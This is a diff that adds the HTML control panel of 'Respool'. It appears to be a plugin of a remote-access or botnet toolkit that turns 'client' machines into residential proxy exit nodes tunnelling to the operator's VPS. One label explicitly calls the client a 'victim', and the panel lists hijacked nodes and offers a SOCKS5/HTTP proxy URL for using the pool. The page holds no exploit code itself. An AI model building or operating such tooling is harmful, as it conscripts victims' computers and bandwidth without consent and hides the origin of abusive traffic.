@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Respool</title>
+  <link rel="stylesheet" href="respool.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Respool</h1>
+    <span class="tag">residential proxy pool</span>
+    <span id="gwBadge" class="badge idle">gateway off</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+        <div class="hint">this client becomes an exit node. no inbound port is opened on it.</div>
+      </div>
+
+      <div class="card">
+        <h2>gateway (vps)</h2>
+        <div class="row">
+          <div>
+            <label for="listenPort">proxy port</label>
+            <input id="listenPort" type="number" value="1080" />
+          </div>
+          <div>
+            <label for="apiPort">api/tunnel port</label>
+            <input id="apiPort" type="number" value="8081" />
+          </div>
+        </div>
+        <label for="token">shared token</label>
+        <div class="row">
+          <input id="token" placeholder="generated on first start" />
+          <button id="genToken" class="btn ghost" title="regenerate">&#8635;</button>
+        </div>
+        <div class="checks">
+          <label><input type="checkbox" id="autostart" /> autostart gateway with the plugin</label>
+        </div>
+        <div class="actions">
+          <button id="startGw" class="btn primary">start gateway</button>
+          <button id="stopGw" class="btn">stop</button>
+        </div>
+        <div id="gwInfo" class="hint"></div>
+      </div>
+
+      <div class="card">
+        <h2>node config</h2>
+        <label for="gatewayAddr">gateway host:port (from the victim's view)</label>
+        <input id="gatewayAddr" placeholder="your.vps.ip:8081" />
+        <label for="nodeToken">token</label>
+        <input id="nodeToken" placeholder="same as gateway token" />
+        <div class="checks">
+          <label><input type="checkbox" id="useTls" checked /> use TLS for the tunnel</label>
+        </div>
+        <div class="row">
+          <div>
+            <label for="maxStreams">max streams</label>
+            <input id="maxStreams" type="number" value="64" />
+          </div>
+          <div>
+            <label for="bandwidthKb">bandwidth kb/s (0 = unlimited)</label>
+            <input id="bandwidthKb" type="number" value="0" />
+          </div>
+        </div>
+        <div class="actions">
+          <button id="nodeStart" class="btn danger">start node</button>
+          <button id="nodeStop" class="btn">stop node</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>pool <span id="nodeCount" class="count">0</span></h2>
+        <div class="stats">
+          <div class="stat"><span id="sNodes">0</span><label>nodes</label></div>
+          <div class="stat"><span id="sStreams">0</span><label>streams</label></div>
+          <div class="stat"><span id="sUp">0</span><label>up</label></div>
+          <div class="stat"><span id="sDown">0</span><label>down</label></div>
+        </div>
+        <table class="tbl">
+          <thead><tr><th>node</th><th>os</th><th>streams</th><th>up</th><th>down</th><th>state</th></tr></thead>
+          <tbody id="nodeBody"></tbody>
+        </table>
+        <div id="nodeEmpty" class="empty">no nodes connected — start the node on a client</div>
+      </div>
+
+      <div class="card">
+        <h2>client usage</h2>
+        <label for="proxyUrl">use it</label>
+        <input id="proxyUrl" readonly value="http://user:pass@your.vps.ip:1080" />
+        <div class="hint">works for HTTP CONNECT and SOCKS5. create keys on the gateway, then point a browser or tool at this URL.</div>
+        <button id="copyProxy" class="btn ghost block">copy</button>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="respool.js"></script>
+</body>
+</html>
